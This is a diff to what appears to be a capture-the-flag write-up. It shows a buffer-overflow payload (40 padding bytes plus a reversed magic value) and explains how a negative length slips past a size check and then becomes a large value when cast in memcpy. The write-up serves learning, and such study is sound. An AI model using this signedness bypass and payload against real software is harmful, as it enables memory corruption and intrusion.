@@ -28,8 +28,10 @@ We calculate the offset between the dest of memcpy and the variable n, from the 
 We craft the payload with the offset and the magic value:
 
 ```python
-b"A"*40 + b"\x57\x4f\x4c\x46"[::-1]
+payload = b"A"*40 + b"\x57\x4f\x4c\x46"[::-1]
 ```
+
+We want to memcpy 44 bytes (40 + 4) to the buffer, so we need to pass a negative value because n * 4 = 44 means n = 11, which is greater than 9, so not possible. With a negative value, we can pass a value that is not greater than 9 but once casted when memcpy is called, it will be greater than 9. With a simple -1, it segfaults.
 
 We brute-force a working negative value:
 ```python
